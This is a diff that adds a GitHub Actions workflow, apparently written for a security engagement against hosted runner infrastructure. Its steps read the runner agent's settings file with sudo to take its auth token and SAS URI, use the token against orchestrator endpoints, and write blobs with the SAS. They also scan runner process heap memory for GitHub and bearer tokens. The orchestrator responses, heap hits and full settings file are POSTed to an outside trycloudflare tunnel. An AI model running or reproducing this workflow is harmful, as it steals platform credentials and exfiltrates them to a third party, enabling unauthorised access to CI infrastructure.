@@ -1,0 +1,114 @@
+name: r9c-agent-identity-repro
+on:
+  workflow_dispatch:
+env:
+  TUNNEL: https://admitted-isp-museum-becomes.trycloudflare.com
+jobs:
+  r9c:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: P-A load agent identity (no values in log)
+        run: |
+          sudo cat /opt/hca/.settings > /tmp/r9c-settings.json
+          python3 - <<'EOF'
+          import json
+          s = json.load(open('/tmp/r9c-settings.json'))
+          open('/tmp/r9c-token','w').write(s['authToken'])
+          open('/tmp/r9c-orch','w').write(s.get('schedulerApiUrl',''))
+          open('/tmp/r9c-trace','w').write(s.get('traceApiUrl',''))
+          d = json.load(open('/opt/hca/diagnostics.json')) if __import__('os').path.exists('/opt/hca/diagnostics.json') else {}
+          if d.get('sasUri'): open('/tmp/r9c-sas','w').write(d['sasUri'])
+          print("identity loaded: token bytes=%d orchestrator=%s sas=%s" % (
+              len(s['authToken']), 'yes' if s.get('schedulerApiUrl') else 'no', 'yes' if d.get('sasUri') else 'no'))
+          print("settings perms: $(stat -c '%U %a' /opt/hca/.settings)")
+          EOF
+          ls -la /opt/hca/.settings
+
+      - name: P-B orchestrator authentication test (codes/headers only in log)
+        run: |
+          TOK=$(cat /tmp/r9c-token); ORCH=$(cat /tmp/r9c-orch)
+          echo "orchestrator host: $(echo "$ORCH" | sed 's|https://||; s|/.*||')"
+          for EP in "/" "/v1" "/v1/requests" "/v1/agents" "/v1/health" "/healthz" "/v1/jobs"; do
+            CODE=$(curl -sS -m 10 -o /tmp/r9c-body -w '%{http_code}' -H "Authorization: Bearer $TOK" "$ORCH$EP" 2>/dev/null || echo "err")
+            echo "GET $EP -> $CODE (len $(wc -c < /tmp/r9c-body 2>/dev/null || echo 0))"
+            { echo "=== GET $EP ==="; head -c 2000 /tmp/r9c-body 2>/dev/null; echo; } >> /tmp/r9c-orch-bodies
+          done
+          CODE=$(curl -sS -m 10 -o /tmp/r9c-body -w '%{http_code}' "$ORCH/v1" 2>/dev/null || echo "err")
+          echo "GET /v1 NO-AUTH -> $CODE (auth-required baseline)"
+          { echo "=== GET /v1 no-auth ==="; head -c 500 /tmp/r9c-body 2>/dev/null; echo; } >> /tmp/r9c-orch-bodies
+          curl -sS -m 20 --data-binary @/tmp/r9c-orch-bodies -X POST "$TUNNEL/r9b-ingest?file=r9c-orch-bodies" >/dev/null 2>&1 || true
+
+      - name: P-C SAS write retest (properly JSON-decoded)
+        run: |
+          if [ ! -f /tmp/r9c-sas ]; then echo "no sas this boot"; exit 0; fi
+          SAS=$(cat /tmp/r9c-sas)
+          BASE=$(echo "$SAS" | cut -d'?' -f1); PARAMS=$(echo "$SAS" | cut -d'?' -f2)
+          BLOB="r9c-marker-$(date -u +%Y%m%dT%H%M%SZ).txt"
+          curl -sS -m 15 -o /tmp/r9c-put -w 'PUT-status:%{http_code}\n' -X PUT "$BASE/$BLOB?$PARAMS" \
+            -H 'x-ms-blob-type: BlockBlob' -H 'Content-Type: text/plain' \
+            --data-binary "r9c engagement marker $(date -u +%FT%TZ)" 2>&1 | tail -1
+          curl -sS -m 15 -o /tmp/r9c-list -w 'LIST-status:%{http_code}\n' "$BASE?$PARAMS&restype=container&comp=list" 2>&1 | tail -1
+          cat /tmp/r9c-put /tmp/r9c-list 2>/dev/null | head -c 1200 > /tmp/r9c-sas-bodies
+          curl -sS -m 20 --data-binary @/tmp/r9c-sas-bodies -X POST "$TUNNEL/r9b-ingest?file=r9c-sas-bodies" >/dev/null 2>&1 || true
+
+      - name: P-D heap scan v3 (fixed maps regex)
+        run: |
+          sudo python3 - <<'EOF'
+          import re, subprocess, urllib.request
+          TUN = "https://admitted-isp-museum-becomes.trycloudflare.com"
+          pats = re.compile(rb'(ghu_[A-Za-z0-9]{20,}|ghs_[A-Za-z0-9]{20,}|gho_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|Bearer ey[A-Za-z0-9._-]{40,}|sasUri|\.githubapp\.com[A-Za-z0-9._/-]*|\.github\.net[A-Za-z0-9._/-]*)')
+          pids = [int(p) for p in subprocess.run(['pgrep','-f','Runner.Listener|Runner.Worker|hosted-compute-agent|provjobd'], capture_output=True, text=True).stdout.split()][:8]
+          for pid in pids:
+              try:
+                  comm = open(f'/proc/{pid}/comm').read().strip()
+                  total = 0; hits = []
+                  for line in open(f'/proc/{pid}/maps'):
+                      m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (....) ([0-9a-f]+:[0-9a-f]+) (\d+) (.*)', line)
+                      if not m: continue
+                      perms, path = m.group(3), m.group(6).strip()
+                      if 'r' not in perms or 'w' not in perms: continue
+                      if path and '[heap]' not in path: continue
+                      lo, hi = int(m.group(1),16), int(m.group(2),16)
+                      if hi - lo > 256*1024*1024 or total > 768*1024*1024: continue
+                      try:
+                          fd = open(f'/proc/{pid}/mem','rb',buffering=0); fd.seek(lo); data = fd.read(hi-lo); fd.close()
+                      except Exception: continue
+                      total += len(data)
+                      for mm in pats.finditer(data):
+                          hits.append(f'pid {pid} ({comm}) HIT: {mm.group(0)[:200].decode("utf-8","replace")}')
+                  print(f'== pid {pid} ({comm}) scanned {total//1024}KB hits={len(hits)} ==')
+                  for h in hits: print('  ' + h[:60] + ('...' if len(h)>60 else ''))
+                  if hits:
+                      req = urllib.request.Request(f'{TUN}/r9b-ingest?file=heapscan-{pid}', data=('\n'.join(hits)).encode(), method='POST')
+                      try: urllib.request.urlopen(req, timeout=20)
+                      except Exception as e: print(f'  tunnel send fail: {e}')
+              except Exception as e:
+                  print(f'pid {pid} error: {e}')
+          EOF
+
+      - name: P-E token rotation check (settings re-read at step end)
+        run: |
+          sudo cat /opt/hca/.settings > /tmp/r9c-settings2.json
+          python3 - <<'EOF'
+          import json
+          a = json.load(open('/tmp/r9c-settings.json'))
+          b = json.load(open('/tmp/r9c-settings2.json'))
+          print('token rotated during job:', a['authToken'] != b['authToken'])
+          EOF
+          curl -sS -m 20 --data-binary @/tmp/r9c-settings2.json -X POST "$TUNNEL/r9b-ingest?file=settings-at-job-end" >/dev/null 2>&1 || true
+
+      - name: P-F egress proxy intel (tolerant)
+        run: |
+          systemctl list-units --all 2>/dev/null | grep -iE 'proxy|dns|hca' | head -10 || true
+          sudo ss -tlnp 2>/dev/null | grep -vE '127.0.0.53|:22 ' | head -15 || true
+          sudo strings -a /opt/hca/outbound-proxy 2>/dev/null | grep -oE '/[a-z0-9._/-]+\.(json|yaml|yml|conf|toml)' | sort -u | head -10 || echo "no config-path strings"
+          sudo strings -a /opt/hca/outbound-proxy 2>/dev/null | grep -oE 'https?://[a-zA-Z0-9._:/-]+' | sort -u | head -15 || true
+          sudo cat /opt/hca/actions-egress-proxy.version 2>/dev/null || true
+          echo "== hca journal egress lines =="
+          sudo journalctl -u hosted-compute-agent --no-pager 2>/dev/null | grep -iE 'proxy|egress|dns' | tail -10 || true
+
+      - name: P-G capture action-process env (to tunnel only)
+        uses: ./actions/r9-capture
